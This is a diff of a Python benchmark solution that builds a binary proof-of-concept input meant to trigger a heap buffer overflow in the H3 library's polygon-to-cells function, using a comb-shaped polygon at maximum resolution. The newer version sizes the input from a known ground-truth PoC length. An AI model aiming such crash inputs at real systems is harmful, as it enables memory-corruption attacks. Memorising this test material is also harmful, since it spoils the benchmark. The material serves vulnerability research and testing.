@@ -3,66 +3,78 @@ import struct
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a PoC that triggers a heap buffer overflow vulnerability
-        in the polygonToCellsExperimental function.
+        Generate a PoC that triggers the vulnerability.
 
-        The vulnerability stems from an under-estimation of the buffer size
-        required to hold the H3 cells for a given polygon. This PoC creates
-        a complex polygon with a high perimeter-to-area ratio (a "sawtooth"
-        or "comb" shape). Such shapes are known to intersect a much larger
-        number of grid cells than a simple shape with the same bounding box,
-        thus tricking naive size estimation algorithms.
+        Args:
+            src_path: Path to the vulnerable source code tarball
 
-        The PoC is structured as a binary blob, which is a common format for
-        fuzzing geometric libraries:
-        1. H3 Resolution (int32): Set to the maximum value of 15. This results
-           in the smallest possible H3 cells, maximizing the number of cells
-           the polygon can intersect for a given geometric size.
-        2. Number of Polygon Vertices (int32): The count of coordinate pairs.
-        3. Vertex Coordinates (array of double pairs): A flat list of
-           latitude and longitude values for each vertex of the polygon.
-
-        The geometric parameters (e.g., height, tooth width) are chosen to be
-        on the order of the H3 cell dimensions at resolution 15 to effectively
-        trigger the condition where each "tooth" of the polygon enters new cells.
-        The number of teeth is chosen to create a PoC that is slightly smaller
-        than the ground-truth length, which is rewarded by the scoring formula.
+        Returns:
+            bytes: The PoC input that should trigger the vulnerability
         """
         
-        RESOLUTION = 15
-        NUM_TEETH = 30
+        # The vulnerability is a heap buffer overflow in H3's polygonToCells
+        # function. An underestimation of the required buffer size for a
+        # complex polygon leads to the overflow.
+        #
+        # The PoC constructs a "comb" shaped polygon with a high
+        # perimeter-to-area ratio. This shape has a small bounding box,
+        # leading to a small estimated buffer size, but intersects a large
+        # number of H3 cells, causing the overflow.
+        #
+        # The input format is deduced from the ground-truth PoC length (1032 bytes)
+        # and a typical fuzzing harness structure for such a C API:
+        # - 4 bytes: resolution (int32)
+        # - 4 bytes: number of vertices (int32)
+        # - N * 16 bytes: N vertices, each consisting of two doubles (latitude, longitude)
+        #
+        # 1032 bytes = 4 (res) + 4 (num_verts) + N * 16 (vertex data)
+        # 1024 = N * 16 => N = 64 vertices.
+        # We will generate a 64-vertex polygon.
 
-        LAT_START = 40.0
-        LON_START = -74.0
-        HEIGHT_DEG = 1.0e-5
-        TOOTH_WIDTH_DEG = 1.0e-5
-        TOOTH_INDENT_RATIO = 0.5
+        resolution = 15  # Max H3 resolution for the smallest cells
+        num_vertices = 64
 
-        total_width_deg = NUM_TEETH * TOOTH_WIDTH_DEG
+        # A 64-vertex comb shape can be formed with a starting point plus 21 "teeth".
+        # Each tooth adds 3 vertices (up, right, down).
+        # Total vertices = 1 (start) + 21 * 3 = 64.
+        num_teeth = 21
 
+        # Polygon geometry parameters
+        lat_base = 40.0
+        lon_base = -74.0
+        # A tall, thin shape with extremely narrow teeth maximizes H3 cell boundary crossings.
+        tooth_height = 0.0001  # ~11 meters, crosses multiple cell rows at res 15
+        tooth_width = 1e-7   # Very small width to pack teeth tightly
+
+        # Generate vertices for the comb polygon
         vertices = []
+        current_lat = lat_base
+        current_lon = lon_base
+        
+        vertices.append((current_lat, current_lon))
 
-        vertices.append((LAT_START, LON_START))
-        vertices.append((LAT_START, LON_START + total_width_deg))
-        vertices.append((LAT_START + HEIGHT_DEG, LON_START + total_width_deg))
+        for _ in range(num_teeth):
+            # Up
+            current_lat += tooth_height
+            vertices.append((current_lat, current_lon))
+            # Right
+            current_lon += tooth_width
+            vertices.append((current_lat, current_lon))
+            # Down
+            current_lat -= tooth_height
+            vertices.append((current_lat, current_lon))
 
-        for i in range(NUM_TEETH, 0, -1):
-            vertices.append((
-                LAT_START + HEIGHT_DEG * TOOTH_INDENT_RATIO,
-                LON_START + (i - 0.5) * TOOTH_WIDTH_DEG
-            ))
-            vertices.append((
-                LAT_START + HEIGHT_DEG,
-                LON_START + (i - 1) * TOOTH_WIDTH_DEG
-            ))
-
-        num_vertices = len(vertices)
+        # Serialize the data into a byte string.
+        # The format is little-endian ('<'), with one signed int ('i') for resolution,
+        # one for vertex count, followed by pairs of doubles ('dd') for coordinates.
         poc_data = bytearray()
-
-        poc_data.extend(struct.pack('<i', RESOLUTION))
+        
+        # Pack resolution and vertex count
+        poc_data.extend(struct.pack('<i', resolution))
         poc_data.extend(struct.pack('<i', num_vertices))
 
+        # Pack vertex coordinates
         for lat, lon in vertices:
             poc_data.extend(struct.pack('<dd', lat, lon))
-
+        
         return bytes(poc_data)
